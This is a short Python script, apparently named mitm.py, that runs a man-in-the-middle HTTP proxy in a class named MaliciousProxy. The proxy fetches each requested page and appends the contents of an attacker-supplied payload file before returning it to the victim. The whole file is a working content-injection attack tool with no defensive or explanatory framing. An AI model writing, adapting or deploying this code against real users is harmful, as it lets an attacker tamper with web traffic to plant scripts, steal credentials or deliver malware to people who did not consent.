import http.server
import urllib.request
import socketserver
import sys

class MaliciousProxy(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if "canonical" not in self.path and "cloudfare" not in self.path and "501" not in self.path:
            html = ""
            self.send_response(200)
            self.end_headers()
            print('- [*] Got request for: {}'.format(self.path))
            with urllib.request.urlopen(self.path) as response:
                html = response.read()
                print(html)
            with open(sys.argv[2], "r") as f:
                file_contents = f.readline()
                b = bytearray(file_contents.encode())
                html += b
            print(type(html))
            self.wfile.write(html)

if len(sys.argv) < 3:
    print('Usage: python3 mitm.py <port> <payload file>')
    exit(1)

port = int(sys.argv[1])
server = socketserver.ThreadingTCPServer(('', port), MaliciousProxy)
print("[*] Serving on port {}".format(port))
server.serve_forever()